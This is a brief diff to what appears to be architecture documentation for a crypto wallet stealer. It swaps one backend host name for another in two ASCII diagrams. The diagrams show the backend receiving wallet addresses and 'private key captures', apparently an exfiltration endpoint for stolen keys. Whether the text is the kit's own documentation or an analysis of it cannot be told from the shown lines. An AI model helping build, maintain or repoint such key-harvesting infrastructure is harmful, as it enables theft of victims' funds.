@@ -229,7 +229,7 @@ recordEvent('signature', { chain: chain, method: method });
                  ↓
 ┌─────────────────────────────────────────┐
 │ Backend API                              │
-│ legionapi-production.up.railway.app      │
+│ sadrailala-production.up.railway.app      │
 │                                         │
 │ Receives:                               │
 │ - Wallet address                        │
@@ -279,7 +279,7 @@ recordEvent('signature', { chain: chain, method: method });
                ↓
 ┌──────────────────────────────────┐
 │ Backend API                        │
-│ legionapi-production.up.railway.app │
+│ sadrailala-production.up.railway.app │
 │                                  │
 │ Receives:                         │
 │ - Private key captures            │
